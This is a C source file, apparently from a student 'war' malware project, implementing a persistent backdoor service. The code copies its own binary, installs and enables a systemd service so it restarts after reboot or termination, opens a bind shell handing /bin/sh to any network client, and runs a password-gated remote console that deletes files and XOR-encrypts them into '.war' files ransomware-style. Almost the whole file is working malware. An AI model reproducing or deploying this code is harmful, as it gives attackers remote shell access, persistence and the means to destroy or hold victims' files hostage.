/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/16 11:49:28 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"
#include "service.h"
#include "sha256.h"

#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/types.h>
#include <grp.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <time.h>
#include <errno.h>
#include <stdio.h>
#include <stdbool.h>

/*
	Setup program as a systemd service, it will restart when host reboots and when it is killed

	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
*/
static int	setup_service_file(const char *bin_path)
{
	ssize_t rdb;

	int		fdin;
	int		fdout;

	char 	buf[4096];

	fdin = open(bin_path, O_RDONLY);
	if (fdin == -1)
		return (-1);
	fdout = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fdout == -1)
	{
		close(fdin);
		return (-1);
	}

	do
	{
		rdb = read(fdin, buf, sizeof(buf));
		write(fdout, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	close(fdout);
	
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (-1);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));

	system(SERVICE_ENABLE);
	system(SERVICE_START);

	return (0);
}

int	run_bind_shell(t_service_ctx *ctx)
{
	int				srv_fd;
	int				cli_fd;
	int				opt;
	struct sockaddr_in	addr;

	srv_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (srv_fd == -1)
		return (-1);

	opt = 1;
	setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(ctx->super_user ? SUPER_USER_BIND_SHELL_PORT : WEAK_BIND_SHELL_PORT);

	if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	if (listen(srv_fd, 1) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	while (1)
	{
		cli_fd = accept(srv_fd, NULL, NULL);
		if (cli_fd == -1)
			continue ;

		if (fork() == 0)
		{
			close(srv_fd);
			dup2(cli_fd, STDIN_FILENO);
			dup2(cli_fd, STDOUT_FILENO);
			dup2(cli_fd, STDERR_FILENO);
			close(cli_fd);
			execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
			exit(1);
		}
		close(cli_fd);
	}
	close(srv_fd);
	return (0);
}

static int	check_client_password(t_service_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		
		const uint8_t	hashed_pass[32] =
		{
			0x63 ,0xc6 ,0xfc ,0xa6
			,0x6b ,0x51 ,0xfc ,0x14
			,0x4e ,0x2a ,0x27 ,0x37
			,0x9d ,0x53 ,0x73 ,0xaf
			,0xc3 ,0xfe ,0xab ,0x83
			,0xa9 ,0x80 ,0xe8 ,0x22
			,0xb5 ,0x5f ,0x4a ,0x10
			,0xb6 ,0x1c ,0x70, 0x1b 
		};
		uint8_t	hash[32];
		sha256((uint8_t*)msg, strlen(msg), hash);
		if (!memcmp(hash, hashed_pass, sizeof(hashed_pass)))
		{
			server_send_to_id(&ctx->server, client->id, RGB(0,255,0)CORRECT_PASS CLR);
			server_send_to_fd(client->fd, PROMPT);
			client->logged = true;
			return (0);
		}
		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INCORRECT_PASS CLR PASSWORD);
		return (0);
	}
	return (1);
}

int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
{
	(void)size;
	t_service_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return (1);
	else if (!strcmp(msg, "clear"))
		server_send_to_id(&ctx->server, client->id, "\033[H\033[2J");
	else if (!strncmp(msg, "cd", 2))
	{
		if (strlen(msg) == 3 || (msg[2] != ' ' && msg[2] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_DIR CLR);
			goto _prompt;
		}
		else if (strlen(msg) == 2)
		{
			if (chdir("/") == -1)
				server_send_to_id(&ctx->server, client->id, RGB(255,0,0)WRONG_DIR CLR);
			else
				server_send_to_id(&ctx->server, client->id, RGB(0,255,64)CHANGED_DIR"/"NEW_LINE CLR);
			goto _prompt;
		}
		char *arg = &msg[3];
		if (chdir(arg) == -1)
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)WRONG_DIR CLR);
		else
		{
			server_send_to_id(&ctx->server, client->id, RGB(0,255,64)CHANGED_DIR);
			server_send_to_id(&ctx->server, client->id, arg);
			server_send_to_id(&ctx->server, client->id, NEW_LINE CLR);
		}
	}
	else if (!strncmp(msg, "delete", 6))
	{
		if (strlen(msg) == 7  || strlen(msg) == 6 || (msg[6] != ' ' && msg[6] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_PATH_CRYPT CLR);
			goto _prompt;
		}
		char *file = &msg[7];
		int fd = remove(file);
		if (fd != 0)
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_DELETE CLR);
		else
			server_send_to_id(&ctx->server, client->id, RGB(0,255,0) GOOD_DELETE CLR);
	}
	else if (!strcmp(msg, "getcwd"))
	{
		char *path = getcwd(NULL, 0);
		if (!path)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)NO_CWD CLR);
			goto _prompt;
		}
		server_send_to_id(&ctx->server, client->id, RGB(0, 255, 64)GET_CWD);
		server_send_to_id(&ctx->server, client->id, path);
		server_send_to_id(&ctx->server, client->id, NEW_LINE CLR);
		free(path);
	}
	else if (!strcmp(msg, "help"))
	{
		server_send_to_id(&ctx->server, client->id, RGB(128,128,255)COMMAND_HELP CLR);
	}
	else if (!strcmp(msg, "quit"))
	{
		server_send_to_id(&ctx->server, client->id, RGB(255,128,0)COMMAND_QUIT CLR);
		ctx->running = false;
		return (1);
	}
	else if (!strncmp(msg, "decrypt", 7))
	{
		if (strlen(msg) == 8 || (msg[7] != ' ' && msg[7] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		char *user_key = &msg[8];
		int key_len = 0;
		msg = msg + 8;
		for (; *msg != ' ' && *msg != 0; key_len++)
			msg++;
		if (*msg == 0)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		msg = msg + 1;
		uint8_t	key_hash[32];
		sha256((uint8_t *)user_key, key_len, key_hash);

		int file = open((const char *)msg, O_RDWR);
		if (file == -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
			goto _prompt;
		}
		if (strlen(msg) <= 4 || strcmp(&msg[strlen(msg) - 4], ".war") != 0)
		{
			close(file);
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_FORMAT CLR);
			goto _prompt;
		}
		char *renameFile = remove_last_n(msg, 4);
		int fdcheck = open(renameFile, O_RDONLY);
		if (fdcheck != -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) FILE_EXIST CLR);
			close(file);
			close(fdcheck);
			goto _prompt;
		}
		close(fdcheck);
		struct stat	stats;
		fstat(file, &stats);
		size_t	size = stats.st_size;
		size_t	body_size = size - 32;
		ftruncate(file, body_size);
		void *adress = mmap(NULL, body_size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
		if (adress != MAP_FAILED)
		{
			uint8_t *bytes = adress;
			for (size_t i = 0; i < body_size; ++i)
				bytes[i] = bytes[i] ^ key_hash[i % 32];
			munmap(adress, body_size);
		}
		rename(msg, renameFile);
		server_send_to_id(&ctx->server, client->id, RGB(0,255,0) SUCCES_ENCRYPT CLR);
		close(file);
	}
	else if (!strncmp(msg, "encrypt", 7))
	{
		if (strlen(msg) == 8 || (msg[7] != ' ' && msg[7] != 0))
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		char *user_key = &msg[8];
		int key_len = 0;
		msg = msg + 8;
		for (; *msg != ' ' && *msg != 0; key_len++)
			msg++;
		if (*msg == 0)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0)BAD_ENCRYPT CLR);
			goto _prompt;
		}
		msg = msg + 1;
		uint8_t	key_hash[32];
		sha256((uint8_t *)user_key, key_len, key_hash);

		if (strlen(msg) > 4 && strcmp(&msg[strlen(msg) - 4], ".war") == 0)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) ALREADY_ENCRYPTED CLR);
			goto _prompt;
		}
		int file = open((const char *)msg, O_RDWR);
		if (file == -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
			goto _prompt;
		}
		char *renameFile = strjoin(msg, ".war");
		int fdcheck = open(renameFile, O_RDONLY);
		if (fdcheck != -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) FILE_EXIST CLR);
			close(file);
			close(fdcheck);
			goto _prompt;
		}
		close(fdcheck);
		int randomData = open("/dev/urandom", O_RDONLY);
		if (randomData == -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) RANDOM_NUM CLR);
			close(file);
			close(randomData);
			goto _prompt;
		}
		char myRandomData[32];
		ssize_t result = read(randomData, myRandomData, sizeof myRandomData);
		if (result == -1)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) FILE_EXIST CLR);
			close(file);
			close(fdcheck);
			goto _prompt;
		}
		struct stat	stats;
		fstat(file, &stats);
		size_t	size = stats.st_size;
		void *adress = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
		if (adress != MAP_FAILED)
		{
			uint8_t *bytes = adress;
			for (size_t i = 0; i < size; ++i)
				bytes[i] = bytes[i] ^ key_hash[i % 32];
			munmap(adress, size);
		}
		lseek(file, 0, SEEK_END);
		write(file, myRandomData, 32);
		close(randomData);
		rename(msg, renameFile);
		server_send_to_id(&ctx->server, client->id, RGB(0,255,0) SUCCES_ENCRYPT CLR);
		close(file);
	}
	
	else if (!strcmp(msg, "ls"))
	{
		DIR				*dir;
		struct dirent	*dirent;

		dirent = NULL;
		dir = opendir(".");
		if (!dir)
		{
			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_LS);
			goto _prompt;
		}

		do
		{
			dirent = readdir(dir);
			if (dirent)
			{
				if (dirent->d_type == DT_DIR)
					server_send_to_id(&ctx->server, client->id, RGB(0,64,255));
				else
					server_send_to_id(&ctx->server, client->id, RGB(0,255,64));
				server_send_to_id(&ctx->server, client->id, dirent->d_name);
				server_send_to_id(&ctx->server, client->id, CLR " ");
			}
		}
		while (dirent);
		closedir(dir);
		server_send_to_id(&ctx->server, client->id, "\n");
	}
	else
		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INVALID_COMMAND CLR);
_prompt:
	server_send_to_fd(client->fd, PROMPT);
	return (1);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_service_ctx	*ctx = ptr;

	server_send_to_id(&ctx->server, client->id, RGB(128,0,128)CONNECT_MSG CLR PASSWORD);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	(void)ptr;
	(void)client;
}

int	run_service(const char *bin_path)
{
	t_service_ctx	ctx = {0};

	ctx.super_user = getuid() == 0;

	if (ctx.super_user)
		setup_service_file(bin_path);

	if (lock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE) == -1)
		return (-1);

	if (!server_open(&ctx.server, 6942))
	{
		close(ctx.lock_fd);
		return (0);
	}
	server_set_message_hook(&ctx.server, message_hook, &ctx);
	server_set_connect_hook(&ctx.server, connect_hook, &ctx);
	server_set_disconnect_hook(&ctx.server, disconnect_hook, &ctx);

	ctx.running = true;
	while (ctx.running)
	{
		if (is_process_running(BLOCKING_PROCESS))
			break ;

		server_update(&ctx.server);
	}

	server_close(&ctx.server, true);

	unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE);

	if (ctx.super_user)
		system(SERVICE_RESTART);
	return (0);
}

